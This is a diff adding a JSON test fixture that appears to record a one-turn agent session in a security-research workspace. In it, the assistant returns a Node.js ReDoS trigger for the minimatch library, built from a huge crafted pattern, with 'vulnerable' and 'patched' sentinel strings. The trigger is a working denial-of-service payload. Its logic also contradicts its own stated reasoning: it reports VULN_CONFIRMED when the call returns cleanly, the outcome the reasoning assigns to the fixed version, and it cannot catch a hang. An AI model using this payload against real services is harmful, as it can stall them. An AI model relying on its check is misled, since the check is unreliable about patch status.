@@ -1,0 +1,64 @@
+[
+  {
+    "type": "system",
+    "subtype": "init",
+    "cwd": "C:\\Users\\Garre\\Workspace\\sec-research",
+    "session_id": "spike-fixture",
+    "model": "claude-sonnet-5"
+  },
+  {
+    "type": "assistant",
+    "message": {
+      "model": "claude-sonnet-5",
+      "id": "msg_spike01",
+      "type": "message",
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "{\"files\": {\"trigger.js\": \"const m = require('minimatch'); try { m('', 'a'.repeat(1e5)+'!(('); process.stdout.write('VULN_CONFIRMED\\n'); process.exit(0);} catch(e){ process.stdout.write('PATCHED_OK\\n'); process.exit(0);} \"}, \"trigger_cmd\": [\"node\", \"trigger.js\"], \"sentinel_confirmed\": \"VULN_CONFIRMED\", \"expected_confirmed_exit\": 0, \"sentinel_patched\": \"PATCHED_OK\", \"expected_patched_exit\": 0, \"reasoning\": \"Differential ReDoS trigger; affected version hangs/throws, fixed version returns cleanly.\"}"
+        }
+      ],
+      "stop_reason": null
+    },
+    "session_id": "spike-fixture"
+  },
+  {
+    "type": "rate_limit_event",
+    "rate_limit_info": {
+      "status": "allowed",
+      "resetsAt": 1782857400,
+      "rateLimitType": "five_hour",
+      "overageStatus": "rejected",
+      "overageDisabledReason": "org_level_disabled",
+      "isUsingOverage": false
+    },
+    "session_id": "spike-fixture"
+  },
+  {
+    "type": "result",
+    "subtype": "success",
+    "is_error": false,
+    "api_error_status": null,
+    "num_turns": 1,
+    "result": "{\"files\": {\"trigger.js\": \"const m = require('minimatch'); try { m('', 'a'.repeat(1e5)+'!(('); process.stdout.write('VULN_CONFIRMED\\n'); process.exit(0);} catch(e){ process.stdout.write('PATCHED_OK\\n'); process.exit(0);} \"}, \"trigger_cmd\": [\"node\", \"trigger.js\"], \"sentinel_confirmed\": \"VULN_CONFIRMED\", \"expected_confirmed_exit\": 0, \"sentinel_patched\": \"PATCHED_OK\", \"expected_patched_exit\": 0, \"reasoning\": \"Differential ReDoS trigger; affected version hangs/throws, fixed version returns cleanly.\"}",
+    "stop_reason": "end_turn",
+    "session_id": "spike-fixture",
+    "total_cost_usd": 0.0042,
+    "usage": {
+      "input_tokens": 220,
+      "cache_creation_input_tokens": 0,
+      "cache_read_input_tokens": 0,
+      "output_tokens": 140
+    },
+    "modelUsage": {
+      "claude-sonnet-5": {
+        "inputTokens": 220,
+        "outputTokens": 140,
+        "costUSD": 0.0042
+      }
+    },
+    "permission_denials": [],
+    "terminal_reason": "completed"
+  }
+]
